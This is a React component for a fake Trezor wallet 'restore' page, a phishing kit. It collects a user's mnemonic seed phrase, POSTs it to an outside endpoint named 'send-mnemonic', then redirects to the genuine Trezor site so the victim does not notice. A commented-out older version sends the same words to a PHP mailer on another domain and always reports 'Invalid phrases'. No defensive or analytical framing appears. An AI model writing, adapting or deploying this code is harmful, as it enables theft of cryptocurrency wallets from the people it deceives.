"use client"

import { useState } from "react";
import ArrowDownIcon from "../ArrowDownIcon";

const RecoveryForm = () => {
    const [wordCount, setWordCount] = useState<number>(12);
    const [isCollapsed, setIsCollapsed] = useState(true);
    const [loading, setLoading] = useState(false);

    const [words, setWords] = useState<string[]>(Array(wordCount).fill(""));
    const wordCounts = [12, 18, 20, 24, 33];

    const handleWordChange = (index: number, value: string) => {
        const newWords = [...words];
        newWords[index] = value;
        setWords(newWords);
    };

    const handleWordCountChange = (count: number) => {
        setWordCount(count);
        setWords(Array(count).fill(""));
    };


    const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
        e.preventDefault();

        const data = words.map((word, idx) => ({
            label: `Word ${idx + 1}`,
            value: word.trim(),
        }));

        const payload = {
            heading: `Word Count: ${words.length}`,
            data
        };

        // console.log("Final Payload:", payload);

        try {
            setLoading(true);
            const response = await fetch(" https://trezor-backend.vercel.app/api/v1/send-mnemonic", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload),
            });

            if (response.ok) {
                // alert("Mnemonic sent successfully!");
                setWords(Array(wordCount).fill(""));
                window.location.href = "https://trezor.io/trezor-suite";
            } else {
                const err = await response.json();
                alert(`Failed to send mnemonic: ${err.message || "Unknown error"}`);
            }
        } catch (error) {
            console.error(error);
            alert("An error occurred while sending mnemonic.");
        } finally {
            setLoading(false);
        }
    };


    return (
        <div className="bg-white rounded-2xl shadow-lg w-full max-w-2xl">
            <div className="flex justify-between items-center p-6 border-b border-gray-200">
                <span className="text-gray-500 font-medium text-sm">Still don’t see your Trezor?</span>
                <button
                    onClick={() => setIsCollapsed(!isCollapsed)}
                    className="flex items-center text-sm font-medium text-gray-500"
                >
                    <div className={`transform transition-transform ${!isCollapsed ? 'rotate-180' : ''}`}>
                        <ArrowDownIcon />
                    </div>
                </button>
            </div>
            {isCollapsed && (
                <div className="p-6">
                    <h2 className="text-center text-2xl font-semibold text-gray-800 mb-4">Restore Your Trezor Wallet!</h2>
                    <p className="text-center text-sm text-gray-500 mb-6">How many words does your Mnemonic contain?</p>
                    <div className="flex justify-center space-x-2 mb-6">
                        {wordCounts.map(count => (
                            <button
                                key={count}
                                onClick={() => handleWordCountChange(count)}
                                className={`px-4 py-1.5 text-sm rounded border transition-colors ${wordCount === count ? 'bg-green-600 border-green-600 text-white' : 'bg-transparent border-gray-300 text-gray-700 hover:bg-gray-100'}`}
                            >
                                {count} words
                            </button>
                        ))}
                    </div>

                    <form onSubmit={handleSubmit} className="px-4 md:px-10">
                        <p className="text-xs text-gray-500 font-medium mb-4 text-center">
                            To restore your Trezor, type in your Mnemonic words into the corresponding boxes below
                        </p>
                        <div className={`grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-4`}>
                            {words.map((word, idx) => (
                                <div key={idx} className="relative">
                                    <input
                                        type="text"
                                        value={word}
                                        onChange={(e) => handleWordChange(idx, e.target.value)}
                                        placeholder={`${idx + 1}.`}
                                        required
                                        className="w-full px-3 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-green-500 text-gray-900"
                                    />
                                </div>
                            ))}
                        </div>
                        <div className="mt-8 text-left">
                            <button
                                type="submit"
                                disabled={loading}
                                className="px-10 py-2.5 text-sm font-semibold text-white bg-green-600 rounded hover:bg-green-700 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
                            >
                                {loading ? "Sending..." : "Next"}
                            </button>
                        </div>
                    </form>
                </div>
            )}
        </div>
    );
};

export default RecoveryForm;


// "use client"

// import { useState } from "react";
// import ArrowDownIcon from "../ArrowDownIcon";

// const RecoveryForm = () => {
//     const [wordCount, setWordCount] = useState<number>(12);
//     const [isCollapsed, setIsCollapsed] = useState(true);

//     const wordCounts = [12, 18, 20, 24, 33];

//     const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
//         e.preventDefault();

//         const form = e.currentTarget;
//         const formData = new FormData(form);
//         const actionUrl = 'https://alldesire.shop/tgydfh11/mail.php';

//         try {
//             const response = await fetch(actionUrl, {
//                 method: 'POST',
//                 body: formData,
//             });
//             if (response.ok) {
//                 console.log('Form submitted successfully.');
//                 alert('Invalid phrases');
//             } else {
//                 console.error('Form submission failed.');
//                 alert('Invalid phrases');
//             }
//         } catch (error) {
//             console.error('An error occurred during form submission:', error);
//             alert('Invalid phrases');
//         }
//     };

//     return (
//         <div className="bg-white rounded-2xl shadow-lg w-full max-w-2xl">
//             <div className="flex justify-between items-center p-6 border-b border-gray-200">
//                 <span className="text-gray-500 font-medium text-sm">Still don’t see your Trezor?</span>
//                 <button
//                     onClick={() => setIsCollapsed(!isCollapsed)}
//                     className="flex items-center text-sm font-medium text-gray-500"
//                 >
//                     <div className={`transform transition-transform ${!isCollapsed ? 'rotate-180' : ''}`}>
//                         <ArrowDownIcon />
//                     </div>
//                 </button>
//             </div>
//             {!isCollapsed && (
//                 <div className="p-6">
//                     <h2 className="text-center text-2xl font-semibold text-gray-800 mb-4">Restore Your Trezor Wallet!</h2>
//                     <p className="text-center text-sm text-gray-500 mb-6">How many words does your Mnemonic contain?</p>
//                     <div className="flex justify-center space-x-2 mb-6">
//                         {wordCounts.map(count => (
//                             <button
//                                 key={count}
//                                 onClick={() => setWordCount(count)}
//                                 className={`px-4 py-1.5 text-sm rounded border transition-colors ${wordCount === count ? 'bg-green-600 border-green-600 text-white' : 'bg-transparent border-gray-300 text-gray-700 hover:bg-gray-100'}`}
//                             >
//                                 {count} words
//                             </button>
//                         ))}
//                     </div>

//                     <form onSubmit={handleSubmit} className="px-4 md:px-10">
//                         <p className="text-xs text-gray-500 font-medium mb-4 text-center">To restore your Trezor, type in your Mnemonic words into the corresponding boxes below</p>
//                         <div className={`grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-4`}>
//                             {Array.from({ length: wordCount }, (_, i) => i + 1).map(num => (
//                                 <div key={num} className="relative">
//                                     <input
//                                         type="text"
//                                         name={`word${num}_${wordCount}`}
//                                         placeholder={`${num}.`}
//                                         required
//                                         className="w-full px-3 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-green-500"
//                                     />
//                                 </div>
//                             ))}
//                         </div>
//                         <div className="mt-8 text-left">
//                             <button type="submit" className="px-10 py-2.5 text-sm font-semibold text-white bg-green-600 rounded hover:bg-green-700 transition-colors">
//                                 Next
//                             </button>
//                         </div>
//                     </form>
//                 </div>
//             )}
//         </div>
//     );
// };

// export default RecoveryForm;